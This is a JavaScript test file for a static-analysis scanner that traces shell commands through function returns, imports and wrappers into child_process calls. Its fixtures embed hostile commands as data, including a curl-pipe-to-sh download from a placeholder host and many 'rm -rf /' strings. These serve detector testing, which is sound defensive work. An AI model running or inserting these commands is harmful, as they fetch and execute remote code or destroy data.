import { afterEach, beforeEach, expect, it } from 'vitest';
import { createRequire } from 'node:module';
import { createHash } from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

const require = createRequire(import.meta.url);
const { scanStaticDirectory } = require('../../src/main/static-analysis');
let root;

beforeEach(() => {
  root = fs.mkdtempSync(path.join(os.tmpdir(), 'aegis-static-js-returns-'));
});
afterEach(() => {
  expect(path.dirname(path.resolve(root))).toBe(path.resolve(os.tmpdir()));
  fs.rmSync(root, { recursive: true, force: true });
});

async function scan(sources) {
  for (const [name, source] of Object.entries(sources)) {
    fs.mkdirSync(path.dirname(path.join(root, name)), { recursive: true });
    fs.writeFileSync(path.join(root, name), source);
  }
  return scanStaticDirectory('package', root);
}

it('tracks a primitive function result into the caller command', async () => {
  const report = await scan({
    'main.cjs': [
      'const { exec } = require("node:child_process");',
      'function command(url) { return "curl " + url + " | sh"; }',
      'exec(command("https://PRIVATE.invalid/install"));',
    ].join('\n'),
  });
  expect(report.findings).toContainEqual(
    expect.objectContaining({
      ruleId: 'STA001',
      path: 'main.cjs',
      line: 3,
      context: 'javascript-command-flow',
      flow: expect.objectContaining({
        sink: expect.objectContaining({ path: 'main.cjs', line: 3 }),
      }),
    }),
  );
  expect(report.safety).toBe('not-determined');
  expect(JSON.stringify(report)).not.toContain('PRIVATE');
});

it('retains all hashes across return forwarding, re-exports and a command wrapper', async () => {
  const sources = {
    'main.mjs': [
      'import { command } from "./relay.mjs";',
      'import { launch } from "./worker.mjs";',
      'launch(command("https://PRIVATE.invalid/install"));',
    ].join('\n'),
    'relay.mjs': 'export { command } from "./command.mjs";',
    'command.mjs': [
      'import { prefix } from "./prefix.mjs";',
      'const finish = value => value + " | sh";',
      'export function command(url) { const text = prefix + url; return finish(text); }',
    ].join('\n'),
    'prefix.mjs': 'export const prefix = "curl ";',
    'worker.mjs': [
      'import { exec } from "node:child_process";',
      'export function launch(value) { return exec(value); }',
    ].join('\n'),
  };
  const report = await scan(sources);
  expect(report.findings).toContainEqual(
    expect.objectContaining({
      ruleId: 'STA001',
      path: 'main.mjs',
      line: 3,
      context: 'javascript-command-flow',
      flow: {
        sink: {
          path: 'worker.mjs',
          line: 2,
          sha256: createHash('sha256').update(sources['worker.mjs']).digest('hex'),
        },
        files: Object.entries(sources)
          .sort(([left], [right]) => left.localeCompare(right))
          .map(([name, source]) => ({
            path: name,
            sha256: createHash('sha256').update(source).digest('hex'),
          })),
      },
    }),
  );
  expect(JSON.stringify(report)).not.toContain('PRIVATE');
});

it('rejects an imported function return after its module uses dynamic code', async () => {
  const report = await scan({
    'main.mjs': [
      'import { exec } from "node:child_process";',
      'import { command } from "./helper.mjs";',
      'exec(command());',
    ].join('\n'),
    'helper.mjs': [
      'export function command() { return "rm -rf /"; }',
      'eval("command = () => \\"echo safe\\"");',
    ].join('\n'),
  });
  expect(report.findings).toEqual([]);
  expect(report.issues).toContainEqual({
    path: 'main.mjs',
    reason: 'javascript-dynamic-code-not-analyzed',
  });
});

it.each([
  ['arrow expression', 'const command = value => value;', 'command("rm -rf /")'],
  [
    'function expression',
    'const command = function (value) { return value; };',
    'command("rm -rf /")',
  ],
  [
    'immutable result alias',
    'const command = value => value; const result = command("rm -rf /");',
    'result',
  ],
  [
    'local immutable prefix',
    'function command(value) { const prefix = "rm "; return prefix + value; }',
    'command("-rf /")',
  ],
  ['template string', 'const command = value => `rm ${value}`;', 'command("-rf /")'],
  [
    'nested arguments',
    'const left = value => value; const right = value => value;',
    'left(right("rm -rf /"))',
  ],
  [
    'nested calls to one function',
    'const command = value => value;',
    'command(command("rm -rf /"))',
  ],
  [
    'return forwarding',
    'const inner = value => value; const command = value => inner(value);',
    'command("rm -rf /")',
  ],
])('resolves a %s into a command', async (_name, declaration, expression) => {
  const report = await scan({
    'main.cjs':
      'const { exec } = require("node:child_process");\n' +
      declaration +
      '\nexec(' +
      expression +
      ');',
  });
  expect(report.findings).toContainEqual(
    expect.objectContaining({
      ruleId: 'STA003',
      path: 'main.cjs',
      line: 3,
      context: 'javascript-command-flow',
    }),
  );
});

it.each([
  [
    'default function',
    'import command from "./helper.mjs";',
    'export default function () { return "rm -rf /"; }',
  ],
  [
    'namespace arrow',
    'import * as helper from "./helper.mjs"; const command = helper.command;',
    'export const command = () => "rm -rf /";',
  ],
  [
    'returned constant export',
    'import { command } from "./helper.mjs";',
    'const value = () => "rm -rf /"; export const command = () => value();',
  ],
])('resolves an imported %s', async (_name, imported, helper) => {
  const report = await scan({
    'main.mjs': 'import { exec } from "node:child_process";\n' + imported + '\nexec(command());',
    'helper.mjs': helper,
  });
  expect(report.findings).toContainEqual(
    expect.objectContaining({
      ruleId: 'STA003',
      path: 'main.mjs',
      line: 3,
      context: 'javascript-command-flow',
    }),
  );
});

it('resolves an exported initialized result without evaluating source', async () => {
  const report = await scan({
    'main.mjs':
      'import { exec } from "node:child_process"; import { command } from "./helper.mjs"; exec(command);',
    'helper.mjs': 'const build = value => value; export const command = build("rm -rf /");',
  });
  expect(report.findings).toContainEqual(
    expect.objectContaining({
      ruleId: 'STA003',
      path: 'main.mjs',
      context: 'javascript-command-flow',
    }),
  );
});

it.each([
  ['async function', 'async function command() { return "rm -rf /"; }', 'command()'],
  ['generator function', 'function* command() { return "rm -rf /"; }', 'command()'],
  ['default parameter', 'function command(value = "rm -rf /") { return value; }', 'command()'],
  ['rest parameter', 'function command(...value) { return value[0]; }', 'command("rm -rf /")'],
  [
    'destructured parameter',
    'function command({ value }) { return value; }',
    'command({ value: "rm -rf /" })',
  ],
  ['missing argument', 'function command(value) { return value; }', 'command()'],
  ['extra argument', 'function command() { return "rm -rf /"; }', 'command("extra")'],
  ['optional call', 'function command() { return "rm -rf /"; }', 'command?.()'],
  ['spread call', 'function command(value) { return value; }', 'command(...["rm -rf /"])'],
  [
    'conditional return',
    'function command(value) { return value ? "rm -rf /" : "echo safe"; }',
    'command(true)',
  ],
  ['conditional body', 'function command() { if (true) return "rm -rf /"; }', 'command()'],
  ['side-effect statement', 'function command() { opaque(); return "rm -rf /"; }', 'command()'],
  [
    'unknown initializer',
    'function command() { const ignored = opaque(); return "rm -rf /"; }',
    'command()',
  ],
  ['sequence expression', 'function command() { return (opaque(), "rm -rf /"); }', 'command()'],
  [
    'parameter assignment',
    'function command(value) { value = "rm -rf /"; return value; }',
    'command("echo safe")',
  ],
  ['mutable alias', 'let command = () => "rm -rf /";', 'command()'],
  [
    'overwritten function',
    'function command() { return "rm -rf /"; } command = () => "echo safe";',
    'command()',
  ],
  ['returned function', 'function command() { return () => "rm -rf /"; }', 'command()()'],
  ['returned object', 'function command() { return { value: "rm -rf /" }; }', 'command().value'],
  ['returned array', 'function command() { return ["rm -rf /"]; }', 'command()[0]'],
  ['mutable local', 'function command() { let value = "rm -rf /"; return value; }', 'command()'],
  ['dynamic argument', 'function command(value) { return value; }', 'command(process.env.PRIVATE)'],
])('leaves the %s unresolved', async (_name, declaration, expression) => {
  const report = await scan({
    'main.cjs':
      'const { exec } = require("node:child_process");\n' +
      declaration +
      '\nexec(' +
      expression +
      ');',
  });
  expect(report.findings).toEqual([]);
  expect(report.complete).toBe(false);
  expect(JSON.stringify(report)).not.toContain('PRIVATE');
});

it('keeps the process result separate from its command argument', async () => {
  const report = await scan({
    'main.cjs': [
      'const { exec } = require("node:child_process");',
      'function launch(value) { return exec(value); }',
      'const result = launch("rm -rf /");',
      'exec(result);',
    ].join('\n'),
  });
  expect(report.findings).toContainEqual(expect.objectContaining({ ruleId: 'STA003', line: 3 }));
  expect(report.findings).not.toContainEqual(expect.objectContaining({ line: 4 }));
  expect(report.issues).toContainEqual({
    path: 'main.cjs',
    reason: 'javascript-return-not-resolved',
  });
});

it('keeps returned shell-looking text as argv data', async () => {
  const report = await scan({
    'main.cjs':
      'const { spawn } = require("node:child_process"); const command = value => value; spawn("echo", [command("rm -rf /")]);',
  });
  expect(report.findings).toEqual([]);
});

it('accepts a returned primitive boolean in an inline shell option', async () => {
  const report = await scan({
    'main.cjs':
      'const { spawn } = require("node:child_process"); const enabled = () => true; spawn("curl", ["https://example.invalid", "|", "sh"], { shell: enabled() });',
  });
  expect(report.findings).toContainEqual(
    expect.objectContaining({ ruleId: 'STA001', context: 'javascript-command-flow' }),
  );
});

it('shares the depth bound across a wrapper and its returned argument chain', async () => {
  const functions = Array.from(
    { length: 8 },
    (_, index) =>
      `function value${index}(input) { return ${index === 7 ? 'input' : 'value' + (index + 1) + '(input)'}; }`,
  );
  const report = await scan({
    'main.cjs': [
      'const { exec } = require("node:child_process");',
      ...functions,
      'function launch(input) { return exec(value0(input)); }',
      'launch("rm -rf /");',
    ].join('\n'),
  });
  expect(report.findings).toEqual([]);
  expect(report.issues).toContainEqual({ path: 'main.cjs', reason: 'javascript-flow-depth-limit' });
});

it('shares the cycle guard between wrapper and return expansion', async () => {
  const report = await scan({
    'main.cjs':
      'const { exec } = require("node:child_process"); function value(input) { return launch(input); } function launch(input) { return exec(value(input)); } launch("rm -rf /");',
  });
  expect(report.findings).toEqual([]);
  expect(report.issues).toContainEqual({ path: 'main.cjs', reason: 'javascript-flow-cycle' });
});

it('shares the call budget with preceding wrapper expansions', async () => {
  const report = await scan({
    'main.cjs': [
      'const { exec } = require("node:child_process");',
      'function launch(value) { opaque(value); }',
      'function command(value) { return value; }',
      'launch("literal");\n'.repeat(256),
      'exec(command("rm -rf /"));',
    ].join('\n'),
  });
  expect(report.findings).toEqual([]);
  expect(report.issues).toContainEqual({ path: 'main.cjs', reason: 'javascript-flow-call-limit' });
});

it('keeps a returned loader specifier unresolved when mutation inspection cannot follow it', async () => {
  const report = await scan({
    'main.cjs': [
      'const moduleName = () => "node:child_process";',
      'mutate(require(moduleName()));',
      'require(moduleName()).exec("rm -rf /");',
    ].join('\n'),
  });
  expect(report.findings).toEqual([]);
  expect(report.issues).toContainEqual({
    path: 'main.cjs',
    reason: 'javascript-module-not-resolved',
  });
});

it('keeps an imported returned loader specifier unresolved across model captures', async () => {
  const report = await scan({
    'main.cjs': [
      'const { specifier } = require("./helper.mjs");',
      'mutate(require(specifier));',
      'require(specifier).exec("rm -rf /");',
    ].join('\n'),
    'helper.mjs': 'const name = () => "node:child_process"; export const specifier = name();',
  });
  expect(report.findings).toEqual([]);
  expect(report.issues).toContainEqual({
    path: 'main.cjs',
    reason: 'javascript-module-not-resolved',
  });
});
